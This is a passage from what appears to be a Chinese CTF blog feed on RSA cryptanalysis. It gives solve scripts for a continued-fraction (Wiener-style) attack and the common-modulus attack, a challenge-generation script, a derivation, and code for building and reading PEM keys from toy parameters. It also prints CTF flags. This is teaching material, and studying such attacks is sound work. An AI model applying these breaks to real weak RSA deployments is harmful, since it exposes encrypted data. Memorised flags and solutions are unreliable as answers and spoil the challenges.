number">15573518512630583133605706431375892476846434992703760807266881477212729790675502562405142453118932977842339803883111403869334521098950030048699583130857582338419182841819307757252097704148569218757559761264396801310961344678392000382263595912787825617009851110457692404940207973548999796553024456145274114257889573707649959860997335143214788897776951837248853483762434899857463503651914305981628033038172123120703537802061315610043298426738218704990852775023413248589434394708618489802771255075164976384643287270994751622452142844176084933641827641239534332334446368745588970480750957569438747829980771324981588625047320914720986351721280038816715323656526802000900688313558979941992015923305782197562859553039256619824373010017972420560224632828808074734952385591551175446599133</span>E2<span class="token operator">=</span><span class="token number">165789626975534012040420057284463500775834911397214992496515507176272849770841998477139944440126985014248815418211585858658342524799286016374109756516450870298232454995876047057825952563581619963387275065218691863272435560584657400761485940130783607258311246708485662913432455714363728035174035069036312370859</span><span class="token keyword">def</span> <span class="token function">transform</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 使用辗转相除将分数x/y转为连分数的形式</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> y<span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x <span class="token operator">//</span> y<span class="token punctuation">)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> x <span class="token operator">%</span> y    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">continued_fraction</span><span class="token punctuation">(</span>sub_res<span class="token punctuation">)</span><span class="token punctuation">:</span>    numerator<span class="token punctuation">,</span> denominator <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> sub_res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token comment"># 从sublist的后面往前循环</span>        denominator<span class="token punctuation">,</span> numerator <span class="token operator">=</span> numerator<span class="token punctuation">,</span> i <span class="token operator">*</span> numerator <span class="token operator">+</span> denominator    <span class="token keyword">return</span> denominator<span class="token punctuation">,</span> numerator  <span class="token comment"># 得到渐进分数的分母和分子，并返回</span><span class="token comment"># 求解每个渐进分数</span><span class="token keyword">def</span> <span class="token function">sub_fraction</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> transform<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>continued_fraction<span class="token punctuation">,</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将连分数的结果逐一截取以求渐进分数</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">wienerAttack</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>q2<span class="token punctuation">,</span> q1<span class="token punctuation">)</span> <span class="token keyword">in</span> sub_fraction<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 用一个for循环来注意试探n1/n2的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span>        <span class="token keyword">if</span> q1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可能会出现连分数的第一个为0的情况，排除</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> n1 <span class="token operator">%</span> q1 <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> q1 <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 成立条件</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>q1<span class="token punctuation">,</span> q2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"该方法不适用"</span><span class="token punctuation">)</span>q1 <span class="token operator">=</span> wienerAttack<span class="token punctuation">(</span>N1<span class="token punctuation">,</span>N2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>q2 <span class="token operator">=</span> wienerAttack<span class="token punctuation">(</span>N1<span class="token punctuation">,</span>N2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>p1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>N1<span class="token operator">//</span>q1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>p2 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>phi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>p1<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>phi2 <span class="token operator">=</span> <span class="token punctuation">(</span>p2<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>p2<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>E1<span class="token punctuation">,</span>phi1<span class="token punctuation">)</span>d2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>E2<span class="token punctuation">,</span>phi2<span class="token punctuation">)</span>m1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d1<span class="token punctuation">,</span>N1<span class="token punctuation">)</span>m2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span>d2<span class="token punctuation">,</span>N2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#GWHT&#123;Crypto_Is_Interesting&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>共模攻击</title>
      <link href="/2023/01/14/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/14/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>共模攻击，利用的大前提就是，RSA体系在生成密钥的过程中使用了相同的模数n。在CTF题目中，就是同一明文，同一n,不同e进行加密。m,n相同；e,c不同，且e1和e2互质</p><h3 id="出题脚本："><a href="#出题脚本：" class="headerlink" title="出题脚本："></a>出题脚本：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token comment">#生成素数</span>p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>e1<span class="token operator">=</span><span class="token number">2333</span>e2<span class="token operator">=</span><span class="token number">23333</span>m<span class="token operator">=</span><span class="token string">"flag&#123;6ed4c74e022cb18c8039e96de93aa9ce&#125;"</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qc1<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e1<span class="token punctuation">,</span>n<span class="token punctuation">)</span>c2<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n1="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e1="</span><span class="token punctuation">,</span>e1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1="</span><span class="token punctuation">,</span>c1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n2="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e2="</span><span class="token punctuation">,</span>e2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2="</span><span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解密脚本："><a href="#解密脚本：" class="headerlink" title="解密脚本："></a>解密脚本：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn<span class="token operator">=</span> <span class="token number">25333966058003377512707481338795714713737652659944601834182685873529702913988641983855700459996104700470621411559153944988952210084014634675583566338568882440708528997808798650962116756969822211586531522430245040013570571043385238601846104615050089457836721437790715225367971106085839523500735480715155424498941150468093083816830215632716244390679417218873179734276657411907216486790815037105108306055794473002315541787461904728375164737225486501009857299717749346279371251245318729951905832578739696926931502225899707226264570557623527701806829827566904224572897378639191756878049342203546309520458672464170859577433</span>e1<span class="token operator">=</span> <span class="token number">2333</span>c1<span class="token operator">=</span> <span class="token number">11355981897781478907853356911752561659125575027336719997290835661089901154031171698660586203170528368228850895159361637188990782030255983633790580700032092629587631108597144196551438410868034739981960656110887650747325311613900008001234835897835613759692146419080113176963747835592656185435741504176116672174539018089139547795447109458469225330809064539216773123671814859510069089532677704482026169178543062578686794346026774853085101278125763460212801929360456888869350105294595904940799522522144740464043605342348269086324747729288399275079874271519208155039364092577755518532799345651172433227745483422620900776136</span>e2<span class="token operator">=</span> <span class="token number">23333</span>c2<span class="token operator">=</span> <span class="token number">1326499538902841116411674554069945581390130048432351353260154261863309471312810811160302458644816390944833633923435634961251092531893503039914793217247984595331920909367627316087404934402312358642315675486438968585084964845763881078835787872160374025547400141298650794551970291119975344578667689961134814676553190178139842507675899262024572370313939107080072875068218336255452161407859907308656094331557912187788276334833723893856310434523337557011032081467262457427167978528280339494077785813461280853735266463152709443731638714219391773144349752633555310299318290576258086971373777118482642702020599928071855133041</span><span class="token comment">#共模攻击</span><span class="token comment">#共模攻击函数</span><span class="token keyword">def</span> <span class="token function">rsa_gong_N_def</span><span class="token punctuation">(</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> n<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>e1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>e2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s1 <span class="token operator">=</span> <span class="token operator">-</span> s1        c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s2 <span class="token operator">=</span> <span class="token operator">-</span> s2        c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s1<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2 <span class="token punctuation">,</span>s2 <span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>m <span class="token operator">=</span> rsa_gong_N_def<span class="token punctuation">(</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="共模攻击原理："><a href="#共模攻击原理：" class="headerlink" title="共模攻击原理："></a>共模攻击原理：</h3><p>两个及以上的公钥(n,e)来加密同一条信息m</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>e1，e2互质，则有</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据扩展欧几里德算法 对于不完全为 0 的整数 a，b，gcd（a，b）表示 a，b 的最大公约数。那么一定存在整数 x，y 使得 gcd（a，b）&#x3D;ax+by</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">e1<span class="token operator">*</span>s1<span class="token operator">+</span>e2<span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>s1、s2皆为整数，但是一正一负，假设s1为正数,s2为负数</p><p>因为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c1 <span class="token operator">=</span> m<span class="token operator">^</span>e1<span class="token operator">%</span>nc2 <span class="token operator">=</span> m<span class="token operator">^</span>e2<span class="token operator">%</span>n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可得：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e1<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token operator">^</span>s1<span class="token punctuation">(</span>m<span class="token operator">^</span>e2<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据模运算性质： 幂运算是一种关于幂的数学运算。同底数幂相乘，底数不变，指数相加。同底数幂相除，底数不变，指数相减。幂的乘方，底数不变，指数相乘。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>a <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">%</span> p <span class="token operator">*</span> b <span class="token operator">%</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> pa <span class="token operator">^</span> b <span class="token operator">%</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">%</span> p<span class="token punctuation">)</span> <span class="token operator">^</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>简化公式为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e1<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token operator">^</span>s1<span class="token operator">*</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e2<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e1<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token operator">^</span>s1<span class="token operator">%</span>n<span class="token operator">*</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e2<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token operator">^</span>s2<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token comment">#(a * b) % p = (a % p * b % p) % p</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e1<span class="token punctuation">)</span><span class="token operator">^</span>s1<span class="token operator">%</span>n<span class="token operator">*</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e2<span class="token punctuation">)</span><span class="token operator">^</span>s2<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token comment">#((a % p) ^ b) % p =a ^ b % p</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e1<span class="token punctuation">)</span><span class="token operator">^</span>s1<span class="token operator">*</span><span class="token punctuation">(</span>m<span class="token operator">^</span>e2<span class="token punctuation">)</span><span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token comment"># (a % p * b % p) % p=(a * b) % p</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">^</span><span class="token punctuation">(</span>e1<span class="token operator">*</span>s1<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>m<span class="token operator">^</span><span class="token punctuation">(</span>e2<span class="token operator">*</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token comment">#。幂的乘方，底数不变，指数相乘。</span><span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token operator">=</span> <span class="token punctuation">(</span>m<span class="token operator">^</span><span class="token punctuation">(</span>e1<span class="token operator">*</span>s1<span class="token operator">+</span>e2<span class="token operator">*</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n  <span class="token comment"># 同底数幂相乘，底数不变，指数相加。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为 e1<em>s1+e2</em>s2 &#x3D; 1 得：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2<span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token operator">=</span> <span class="token punctuation">(</span>m<span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">(</span>c1<span class="token operator">^</span>s1<span class="token operator">*</span>c2<span class="token operator">^</span>s2）<span class="token operator">%</span>n<span class="token operator">=</span>m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上述就是rsa共模攻击的过程</p><p>因此，同一m，同一n,不同e，进行加密。在不需要知道d的情况下，可以进行解密。 </p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA密钥生成与读取</title>
      <link href="/2023/01/14/RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/"/>
      <url>/2023/01/14/RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>需要安装pycryptodome模块 </p><p>公钥生成：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSAp<span class="token operator">=</span> <span class="token number">787228223375328491232514653709</span>q<span class="token operator">=</span> <span class="token number">814212346998672554509751911073</span>n<span class="token operator">=</span> <span class="token number">640970939378021470187479083920100737340912672709639557619757</span>d<span class="token operator">=</span> <span class="token number">590103645243332826117029128695341159496883001869370080307201</span>e<span class="token operator">=</span> <span class="token number">65537</span>rsa_components <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">)</span>keypair <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span>rsa_components<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'pubckey.pem'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f <span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>keypair<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>私钥生成：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSAp<span class="token operator">=</span> <span class="token number">787228223375328491232514653709</span>q<span class="token operator">=</span> <span class="token number">814212346998672554509751911073</span>n<span class="token operator">=</span> <span class="token number">640970939378021470187479083920100737340912672709639557619757</span>d<span class="token operator">=</span> <span class="token number">590103645243332826117029128695341159496883001869370080307201</span>e<span class="token operator">=</span> <span class="token number">65537</span>rsa_components <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>keypair <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span>rsa_components<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'private1.pem'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f <span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>keypair<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>公钥读取：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pubckey.pem"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n = %d'</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'e = %d'</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>e<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>私钥读取：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"private1.pem"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n = %d'</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'e = %d'</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'d = %d'</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>d<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p = %d'</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q = %d'</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>q<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 